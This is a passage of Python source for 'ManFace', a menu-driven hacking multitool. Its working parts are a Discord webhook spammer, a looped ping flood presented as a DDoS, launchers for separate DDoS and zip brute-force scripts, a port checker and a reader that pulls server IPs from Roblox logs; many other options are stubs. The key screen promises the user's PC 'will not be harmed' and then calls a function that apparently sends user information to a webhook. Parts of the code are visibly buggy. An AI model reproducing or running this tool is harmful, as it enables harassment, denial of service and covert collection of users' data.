        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3

        print(welcome3, text3)
    
        L4Command = input(f"""\n   ┏━━({hostname}-admin[{green}1{white}]Layer-4)━[$]
    ┗━$> """)
        
        if L4Command == "Exit":
            time.sleep(0.5)
            exit_command()
        elif L4Command == "exit":
            time.sleep(0.5)
            exit_command()
        elif L4Command == "1":
            time.sleep(0.5)
            os.system("cls")
            exit_command()
        elif L4Command == "2":
            print("Does not work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "3":
            def IPv4LookUp():
                IP = input("    IP: ")
                url = f"https://www.infobyip.com/ipwhois-{IP}.html"
                response = urllib.request.urlopen(url)
                data = response.read(response)
                print(data)
            IPv4LookUp()
            os.system("cls")
            time.sleep(5)
            Layer4()
        elif L4Command == "4":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "5":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "6":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "7":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            Layer4()
        elif L4Command == "8":
            time.sleep(0.5)
            os.system("cls")
            onstart()
        else:
            print(f"{red}    THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(0.5)
            os.system("cls")
            Layer4()


    def menuPage2():
        hostname = socket.gethostname()
        """print("Hostname:", hostname)"""

        welcome2 = """
    Welcome To"""

        text2 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                            :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                    ███╗   ███╗ █████╗ ███╗   ██╗        ███████╗ █████╗  ██████╗███████╗
                    ████╗ ████║██╔══██╗████╗  ██║        ██╔════╝██╔══██╗██╔════╝██╔════╝
                    ██╔████╔██║███████║██╔██╗ ██║ █████╗ █████╗  ███████║██║     █████╗  
                    ██║╚██╔╝██║██╔══██║██║╚██╗██║ ╚════╝ ██╔══╝  ██╔══██║██║     ██╔══╝  
                    ██║ ╚═╝ ██║██║  ██║██║ ╚████║        ██║     ██║  ██║╚██████╗███████╗
                    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝        ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝ [{white}PAGE{red}]{Fore.YELLOW} 2{red}
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white}
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}40{white}] {green}>{white}              [{cyan}50{white}] {green}>{white}              [{cyan}60{white}] {green}>{white}              [{cyan}70{white}] {green}>{white}              ┃
        ┃ [{cyan}41{white}] {green}>{white} Dox-list     [{cyan}51{white}] {green}>{white}              [{cyan}61{white}] {green}>{white}              [{cyan}71{white}] {green}>{white}              ┃
        ┃ [{cyan}42{white}] {green}>{white}              [{cyan}52{white}] {green}>{white}              [{cyan}62{white}] {green}>{white}              [{cyan}72{white}] {green}>{white}              ┃
        ┃ [{cyan}43{white}] {green}>{white}              [{cyan}53{white}] {green}>{white}              [{cyan}63{white}] {green}>{white}              [{cyan}73{white}] {green}>{white}              ┃
        ┃ [{cyan}44{white}] {green}>{white}              [{cyan}54{white}] {green}>{white}              [{cyan}64{white}] {green}>{white}              [{cyan}74{white}] {green}>{white}              ┃
        ┃ [{cyan}45{white}] {green}>{white}              [{cyan}55{white}] {green}>{white}              [{cyan}65{white}] {green}>{white}              [{cyan}75{white}] {green}>{white}              ┃
        ┃ [{cyan}46{white}] {green}>{white}              [{cyan}56{white}] {green}>{white}              [{cyan}66{white}] {green}>{white}              [{cyan}76{white}] {green}>{white}              ┃
        ┃ [{cyan}47{white}] {green}>{white}              [{cyan}57{white}] {green}>{white}              [{cyan}67{white}] {green}>{white}              [{cyan}77{white}] {green}>{white}              ┃
        ┃ [{cyan}48{white}] {green}>{white}              [{cyan}58{white}] {green}>{white}              [{cyan}68{white}] {green}>{white}              [{cyan}78{white}] {green}>{white} Prev-page(1) ┃
        ┃ [{cyan}49{white}] {green}>{white}              [{cyan}59{white}] {green}>{white}              [{cyan}69{white}] {green}>{white}              [{cyan}79{white}] {green}>{white} Next-page(3) ┃
        ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3
        print(welcome2, text2)
    
        command2 = input(f"""\n   ┏━━({hostname}-admin[{green}1{white}]Home)━[$]
    ┗━$> """)
        if command2 == "Exit":
            exit_command()
        elif command2 == "exit":
            exit_command()

        elif command2 == "40":
            os.system("cls")
            exit_command()

        elif command2 == "41":
            time.sleep(0.5)
            os.system("cls")
            Dox_list()
        elif command2 == "42":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "43":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "44":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "45":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "46":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "47":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "48":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "49":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "50":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "51":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "52":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "53":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "54":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "55":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "55":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "56":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "57":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "58":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "59":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "60":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "61":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "62":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "63":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "64":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "65":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "66":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "67":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "68":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "69":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "70":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "71":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "72":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "73":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "74":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "75":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "76":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "77":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        elif command2 == "78":
            os.system("cls")
            onstart()
        elif command2 == "79":
            print("    Doesn't work")
            time.sleep(1)
            os.system("cls")
            menuPage2()
        else:
            print(f"    {red}THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(1)
            os.system("cls")
            menuPage2()


    def menuPage1():

        global onstart

        if not is_admin():
            os.system(f"cls && title Home - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Home - MANFACE v1.0.0 [RUNNING AS ADMIN]")

        hostname = socket.gethostname()
        """print("Hostname:", hostname)"""
        Admin = "DESKTOP-OFALC7N"

        for u in users:
            if hostname == Admin:
                print("")

        welcome1 = """
    Welcome To"""

        text1 = f"""
        {red}                                                                   
                    ...                                                            ...
                !G&&&&&B5~                                                    ~YB&&&&#P!
                ..:!G&@@@@&Y.             .:~!77!~~~~~~!77!~:.             .J&@@@@&P!:..
                    .5&@&&@&Y.       .~YGG5?!:.         :~?5GGY!.        J&@&&&&5.
                        ^&@&&&@&!    !P#B5?~:.....      .. ..:^!5B#G7.   !&@&&&@&~
                        .#@&&&&@G^J&@&G7:   :^^.        .^^.   :!G&@&5:P@@&&&&&:
                            #@&&&@G ... 5:B&Y~..   ~? . .:~Y&#.5 ..: G@&&&&&
                            !@&&&&!     777@! .   .~~.   . ~@?~!     ~&&&&@?
                            !&@&&&&Y.   ?:#P. 7^^:..:^^7 .P&:J   .Y&&&&@&?
                            :!^.J@P^^G&5. .!!PY^^7~ :^ ~7~^JP!7. .P&B^~Y@5:^!:
                    ███╗   ███╗ █████╗ ███╗   ██╗        ███████╗ █████╗  ██████╗███████╗
                    ████╗ ████║██╔══██╗████╗  ██║        ██╔════╝██╔══██╗██╔════╝██╔════╝
                    ██╔████╔██║███████║██╔██╗ ██║ █████╗ █████╗  ███████║██║     █████╗  
                    ██║╚██╔╝██║██╔══██║██║╚██╗██║ ╚════╝ ██╔══╝  ██╔══██║██║     ██╔══╝  
                    ██║ ╚═╝ ██║██║  ██║██║ ╚████║        ██║     ██║  ██║╚██████╗███████╗
                    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝        ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝ [{white}PAGE{red}]{Fore.YELLOW} 1{red}
                                :?PY7~^^~~^~!JG:!!@@&#@@7!:GY7~~~~^^~7YP?:
                                ^B&&&&&&#7:?Y:77##J7#&J7.?!^!B&&&&&&#^
                                    Y&#&&&@@~   ^7^ .. ^!^   :&@&&@#&5
                                    PYG&&&@J ^^^.  ..  .^~: ~@&&#B7G
                                    J7:#B@&PG5G~P~?  7~P~B5GP&@#B~~Y
                                    BY 7J&&5YGB55@!Y5!&P5BP55&@Y? 7#
                                    5&:~JGGBP!J.^P JY Y^.J^YBGGY~.BG
                                    ~PB~.^Y&&B5GYJ5P?P?5G&&Y7.^BG!
                                        .57 J?BPG&5?Y5?#5BPB?Y.!P:
                                        JG:^J!!7??Y5J7?!~Y^.P5
                                            .#G!:. . PB ^ .:7P#.
                                            75BG5^ ~7 ^YP#P7
                                                ..~7~^7~..
                                                    .. 
        {white} 
        ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
        ┃ [{red}DISCORD{white}]discord.gg/jGYTrstr                                                    ┃
        ┃ [{cyan}DISCORD{white}] swedish.man                                                           ┃
        ┃ [{red}VERSION{white}] 1.0.0                                                                 ┃
        ┃ [{cyan}USER{white}] {hostname}                                                          ┃
        ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
        ┃ [{red}Exit{white}] {green}>{white} Exit                                                                   ┃
        ┃                                                                                 ┃
        ┃ [{cyan}0{white}] {green}>{white} Layer-4      [{cyan}10{white}] {green}>{white} IP-Grabber   [{cyan}20{white}] {green}>{white} Wifi-Brute   [{cyan}30{white}] {green}>{white}               ┃ 
        ┃ [{cyan}1{white}] {green}>{white} Layer-7      [{cyan}11{white}] {green}>{white} Port-Check   [{cyan}21{white}] {green}>{white} Zip-Brute    [{cyan}31{white}] {green}>{white}               ┃
        ┃ [{cyan}2{white}] {green}>{white} Webhook-Spam [{cyan}12{white}] {green}>{white}              [{cyan}22{white}] {green}>{white}              [{cyan}32{white}] {green}>{white}               ┃
        ┃ [{cyan}3{white}] {green}>{white} Phone-lookup [{cyan}13{white}] {green}>{white}              [{cyan}23{white}] {green}>{white}              [{cyan}33{white}] {green}>{white}               ┃
        ┃ [{cyan}4{white}] {green}>{white}              [{cyan}14{white}] {green}>{white}              [{cyan}24{white}] {green}>{white}              [{cyan}34{white}] {green}>{white}               ┃
        ┃ [{cyan}5{white}] {green}>{white}              [{cyan}15{white}] {green}>{white} R-IP-Grabber [{cyan}25{white}] {green}>{white}              [{cyan}35{white}] {green}>{white}               ┃
        ┃ [{cyan}6{white}] {green}>{white} Chat         [{cyan}16{white}] {green}>{white}              [{cyan}26{white}] {green}>{white}              [{cyan}36{white}] {green}>{white}               ┃
        ┃ [{cyan}7{white}] {green}>{white}              [{cyan}17{white}] {green}>{white}              [{cyan}27{white}] {green}>{white}              [{cyan}37{white}] {green}>{white}               ┃
        ┃ [{cyan}8{white}] {green}>{white}              [{cyan}18{white}] {green}>{white}              [{cyan}28{white}] {green}>{white}              [{cyan}38{white}] {green}>{white} Admin         ┃
        ┃ [{cyan}9{white}] {green}>{white}              [{cyan}19{white}] {green}>{white} DDoS         [{cyan}29{white}] {green}>{white}              [{cyan}39{white}] {green}>{white} Next-page(3)  ┃
        ┣━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━┫
        ┃ [{cyan}C{white}] {green}>{white} Credits   ┃                                            ┃ [{cyan}S{white}] {green}>{white} Settings   ┃
        ┗━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛
    """ #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3
        print(welcome1, text1)

        command = input(f"""\n   ┏━━({hostname}-admin[{green}1{white}]Home)━[$]
    ┗━$> """)

        if command == "Exit":
            time.sleep(0.5)
            exit_command()
        if command == "exit":
            time.sleep(0.5)
            exit_command()

        if command == "0":
            os.system("cls")
            Layer4()
            
        elif command == "C":
            os.system("cls")
            print(f"[{cyan}Developers{white}] swedish.man(Swedish Man)\n[{cyan}ManFace.py Founder{white}] swedish.man(Swedish Man)\n[{cyan}Name(ManFace) founder{white}] Nick\n[{cyan}Ideas{white}] Nick, swedish.man(Swedish Man)\n")
            command = input("Press enter to go back... ")
            if command == "":
                onstart()
            else:
                onstart()

        elif command == "c":
            os.system("cls")
            print(f"[{cyan}Developers{white}] swedish.man(Swedish Man)\n[{cyan}ManFace.py Founder{white}] swedish.man(Swedish Man)\n[{cyan}Name(ManFace) founder{white}] Nick\n[{cyan}Ideas{white}] Nick, swedish.man(Swedish Man)\n")
            command = input("Press enter to go back... ")
            if command == "":
                onstart()
            else:
                onstart()

        elif command == "1":
            os.system("cls")
            Layer7()

        elif command == "2":
            webhook = input("   Enter valid discord webhook: ")
            print("    Checking...")
            def check_webhook(webhook):
                try:
                    response = requests.get(webhook)
                    if response.status_code == 200:
                        print(f"    Webhook is {green}valid{white} and working.")
                    else:
                        print(f"    Webhook responded with status code {response.status_code}.")
                except requests.RequestException as e:
                    print(f"    An {red}error{white} occurred: {str(e)}")

            check_webhook(webhook)
            time.sleep(1)
            msg = input("    Please Insert webhook Spam Message: ")
            def spam(msg, webhook):
                for i in range(30):
                    try:   
                        data = requests.post(webhook, json={'content': msg})
                        if data.status_code == 200:
                            print(f"    Ctrl + C to stop. Sent MSG: {green}{msg}{white}")
                    except:
                        print("    Stoping...")
                        time.sleep(5)
                        onstart()
            counts = 1
            while counts == 1:
                spam(msg, webhook)

        elif command == "3":
            time.sleep(0.5)
            os.system("cls")
            phoneLookUp()

        elif command == "4":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()

        elif command == "5":
            os.system("cls")
            def run_BruteZip_file(BruteZipfile_path):
                try:
                    subprocess.run(["python", BruteZipfile_path], check=True)
                except FileNotFoundError:
                    print("Brute-face file was not found. Wanna install it?")
                    BruteFace_Install = input("Y/N: ")
                    if BruteFace_Install == "Y":
                        print(f"{green}Installing...{white}")
                        time.sleep(2.5)
                        exit_command()
                    elif BruteFace_Install == "y":
                        print(f"{green}Installing...{white}")
                        time.sleep(2.5)
                        exit_command()
                    elif BruteFace_Install == "N":
                        time.sleep(0.5)
                        onstart()
                    elif BruteFace_Install == "n":
                        time.sleep(0.5)
                        onstart()
                    else:
                        print(f"{red}  THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(0.5)
            BruteZipfile_path = "Zip-bruteforce/Zip-bruteforce.py"
            run_BruteZip_file(BruteZipfile_path)
        elif command == "6":
            os.system("cls")
            chat()
        elif command == "7":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "8":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "9":
            time.sleep(0.5)
            IP_grabber()
        elif command == "10":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "11":
            def check_ports(ip, ports):
                for port in ports:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        print(f"    Port {port} is {green}open{white}")
                    else:
                        print(f"    Port {port} is {red}closed{white}")
                    sock.close()
            def check_portsStart():
                if not is_admin():
                    os.system(f"cls && title Port-Checker - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
                elif is_admin():
                    os.system(f"cls && title Port-Checker - MANFACE v1.0.0 [RUNNING AS ADMIN]")
                check_ports(IPcommand, ports)
            IPcommand = input("    IP Adress: ")
            ports = [21, 22, 53, 80, 443, 8080]
            check_portsStart()
            time.sleep(2.5)
            onstart()

        elif command == "12":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "13":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "14":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "15":
            time.sleep(0.5)
            LOG_FILE = open(
                file     = max(glob(f"{expanduser('~')}\AppData\Local\Roblox\logs\*"), key = getctime),
                encoding = 'utf-8'
            ).readlines()

            def server_grabber():
                log_data = ''.join([line for line in LOG_FILE if 'Connection accepted from' in line]).replace('|', ':')
                server_ips = findall(r'\d+(?:\.\d+){3}:\d+', log_data)
                server_ips[-1] = f'Current server: {server_ips[-1]}'
                return ' -> '.join(server_ips)
            
            print(server_grabber())
            time.sleep(5)
            onstart()

        elif command == "16":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "17":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "18":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "19":
            time.sleep(0.5)
            os.system("cls")
            def run_ddos_file(file_path):
                try:
                    subprocess.Popen(["start", "cmd", "/k", "python", file_path], shell=True)
                except Exception as e:
                    print("    File not found. Do you have it installed?")
                    DDoSInstalled_ = input("    Y/N: ")
                    if DDoSInstalled_ == "Y":
                        print("    Check if the file is in the right dir.")
                        time.sleep(2)
                        onstart()
                    if DDoSInstalled_ == "y":
                        print("    Check if the file is in the right dir.")
                        time.sleep(2)
                        onstart()
                    if DDoSInstalled_ == "N":
                        print("    Do you wan't to install it?")
                        DDoS_Installed_ = input("   Y/N: ")
                        if DDoS_Installed_ == "Y":
                            print(f"{green}    Installing...")
                    if DDoSInstalled_ == "n":
                        print("    Do you wan't to install it?")
                        if DDoS_Installed_ == "y":
                            print(f"{green}    Installing...")
            if __name__ == "__main__":
                file_path = "DDoS/ManFace_DDoS.py"
                run_ddos_file(file_path)
            onstart()
        elif command == "20":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "21":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "22":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "23":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "24":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "25":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "26":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "27":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "28":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "29":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "30":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "31":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "32":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "33":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "34":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "35":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "36":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "37":
            print("    Doesn't work")
            time.sleep(0.5)
            os.system("cls")
            onstart()
        elif command == "38":
            os.system("cls")
            time.sleep(0.5)
            onstart()
        elif command == "39":
            os.system("cls")
            menuPage2()
        else:
            print(f"    {red}THAT COMMAND DOES NOT EXIST{white}")
            time.sleep(2.5)
            onstart()

    def onstart():
        if not is_admin():
            os.system(f"cls && title Home - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Home - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        menuPage1()

    def DDoS():
        print("\n    Run as admin for it to work. There's no botnets so for now it's a DoS")
        time.sleep(1)
        Target = input("\n    Enter target: ")
        time.sleep(0.5)

        for x in range(100):
            os.system(f"ping -t {Target}")
        print(x)
        onstart()

    def DDoSstart():
        if not is_admin():
            os.system(f"cls && title DDoS - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title DDoS - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        DDoS()

    def chat():
        def get_ipv4_address():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ipv4_address = s.getsockname()[0]
                s.close()
                return ipv4_address
            except Exception as e:
                print("Error occurred while fetching IPv4 address:", e)
                return None

        ipv4_address = get_ipv4_address()
        print("    Chat works but ending the session does not work yet. To end the session you have to restart")
        time.sleep(0.5)
        choice = input("\n    HOST (1) OR CONNECT (2): ")
        
        if choice == "1":
            print(f"{Fore.YELLOW}    HOSTING...{white}")
            Chat_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Chat_server.bind((ipv4_address, 9999))
            Chat_server.send(ipv4_address, Chat_client)
            Chat_server.listen()
            print(f"{green}    HOSTING ON: {ipv4_address}:9999{white}")
            

            Chat_client, _ = Chat_server.accept()
        elif choice == "2":
            print(f"{green}    CONNECTING...{white}")
            time.sleep(0.5)
            Chat_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            Chat_client.connect((ipv4_address, 9999))
            print(f"{green}    CONNECTED TO: {Chat_server}{white}")
        else:
            print(f"{red}    FAILED TO CONNECT TO CHAT SERVER{white}")
            time.sleep(3)
            onstart()

        def sending_message(c):
            while True:
                message = input("")
                c.send(message.encode())
                print(f"{green}YOU:> {white}" + message)

        def receiving_messages(c):
            while True:
                print(f"{green}\nPARTNER:> {white}" + c.recv(1024).decode())

        threading.Thread(target=sending_message, args=(Chat_client,)).start()
        threading.Thread(target=receiving_messages, args=(Chat_client,)).start()

    def chatstart():
        if not is_admin():
            os.system(f"cls && title Chat - MANFACE v1.0.0 [WARNING] You are running ManFace without admin privileges, some options might fail and crash")
        elif is_admin():
            os.system(f"cls && title Chat - MANFACE v1.0.0 [RUNNING AS ADMIN]")
        chat()

    #============================================================KEY SYSTEM============================================================#

    def Key(users):
            os.system("cls")

            KeyTextCheckbox = f"""
    {red}    ██╗  ██╗███████╗██╗   ██╗
        ██║ ██╔╝██╔════╝╚██╗ ██╔╝
        █████╔╝ █████╗   ╚████╔╝ 
        ██╔═██╗ ██╔══╝    ╚██╔╝  
        ██║  ██╗███████╗   ██║   
        ╚═╝  ╚═╝╚══════╝   ╚═╝   
        
        {white}[{cyan}NOTICE{white}]You are in the test version and theres no database here, therefore the your is: {Password}

        {white}[{red}WARNING{white}]This version is for IP grabbing and different attacks
        press X to check the checkbox bellow to agree to be a test subject. Your PC will not be harmed.

        {green}[X]{white}
        {white}"""

            KeyTextNoCheckbox = f"""
    {red}    ██╗  ██╗███████╗██╗   ██╗
        ██║ ██╔╝██╔════╝╚██╗ ██╔╝
        █████╔╝ █████╗   ╚████╔╝ 
        ██╔═██╗ ██╔══╝    ╚██╔╝  
        ██║  ██╗███████╗   ██║   
        ╚═╝  ╚═╝╚══════╝   ╚═╝   
        
        {white}[{cyan}NOTICE{white}]You are in the test version and theres no database here, therefore your key is: {Password}

        {white}[{red}WARNING{white}]This version is for IP grabbing and different attacks
        press X to check the checkbox bellow to agree to be a test subject. Your PC will not be harmed.

        {red}[ ]{white}
        {white}""" #use this website "https://patorjk.com/software/taag/#p=display&f=Big&t=Type%20Something%20" and paste it at the first 3

            print(KeyTextNoCheckbox)

            checkbox = input("     ")
            if checkbox == "X" or "x":
                os.system("cls")
                print(KeyTextCheckbox)


            while True:
                username = input(f"""
        [Key] """)

                for u in users:
                    if username == u[0]:
                        print(f"    [{cyan}Checking key{white}]")
                        time.sleep(1)
                        print(f"    [{green}SUCCESS{white}]")
                        time.sleep(0.5)
                        UserInfoWebhookSender()
                        time.sleep(0.5)
                        menuPage1()
                        return username
                print(f"    [{red}Key{white}]Key is incorrect. Try again.")
                time.sleep(1)
                os.system("cls")
                print(KeyTextCheckbox)
                time.sleep(0.1)

    uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
